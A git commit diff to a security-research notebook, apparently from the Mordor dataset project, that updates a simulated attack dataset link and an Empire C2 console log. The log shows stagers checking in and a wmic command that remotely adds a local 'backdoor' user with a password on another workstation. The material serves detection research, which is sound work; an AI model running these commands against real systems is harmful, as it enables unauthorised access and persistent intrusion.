dd3a8644e8f3f4bbee7e43e0ffc11cf0849407b9
Roberto Rodriguez <rrodri0622@gmail.com>
2020-09-14 08:31:45 -0400

    updated wmic add user backdoor

--- docs/_build/jupyter_execute/notebooks/small/windows/08_lateral_movement/SDWIN-190518231333.py
+++ docs/_build/jupyter_execute/notebooks/small/windows/08_lateral_movement/SDWIN-190518231333.py
@@ -13,7 +13,7 @@
 | Technique(s)          | ['[T1047](https://attack.mitre.org/techniques/T1047)'] |
 | Simulaton Environment | Mordor shire |
 | Simulation Scripts    | [None] |
-| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz |
+| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip |
 | References        | None |
 
 ## Dataset Description
@@ -21,23 +21,43 @@ This dataset represents adversaries using WMI to add a backdoor user on endpoint
 
 ## Adversary View
 ```
-(Empire: V6W3TH8Y) > shell wmic /node:IT001 process call create "net user /add backdoor pa$$w0rd1"
-[*] Tasked V6W3TH8Y to run TASK_SHELL
-[*] Agent V6W3TH8Y tasked with task ID 12
-(Empire: V6W3TH8Y) > Executing (Win32_Process)->Create()
+(Empire: agents) > 
+[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
+[*] New agent 6Z78CY25 checked in
+[+] Initial agent 6Z78CY25 from 172.18.39.5 now active (Slack)
+[*] Sending agent (stage 2) to 6Z78CY25 at 172.18.39.5
+agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+KFL6CMNZ ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         7584   5/0.0    2020-09-14 11:33:59  http            
+YGBLW8EM ps 172.18.39.5     WORKSTATION5      *THESHIRE\wardog        powershell         8924   5/0.0    2020-09-14 11:40:53  http            
+UBCKLYFA ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5412   5/0.0    2020-09-14 11:57:16  http            
+
+6Z78CY25 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         9564   5/0.0    2020-09-14 12:02:08  http            
+
+(Empire: agents) > interact 6Z78CY25
+(Empire: 6Z78CY25) > 
+(Empire: 6Z78CY25) > shell wmic /node:WORKSTATION6 process call create "net user /add backdoor pa$$w0rd1"
+[*] Tasked 6Z78CY25 to run TASK_SHELL
+[*] Agent 6Z78CY25 tasked with task ID 1
+(Empire: 6Z78CY25) > 
+Executing (Win32_Process)->Create()
 
 Method execution successful.
 
 Out Parameters:
 instance of __PARAMETERS
 {
-  ProcessId = 6580;
+  ProcessId = 7768;
   ReturnValue = 0;
 };
 
 ..Command execution completed.
 
-(Empire: V6W3TH8Y) >
+(Empire: 6Z78CY25) >
 ```
 
 ## Explore Mordor Dataset
@@ -49,7 +69,7 @@ spark = get_spark()
 
 ### Download & Process Mordor File
 
-mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz"
+mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip"
 registerMordorSQLTable(spark, mordor_file, "mordorTable")
 
 ### Get to know your data
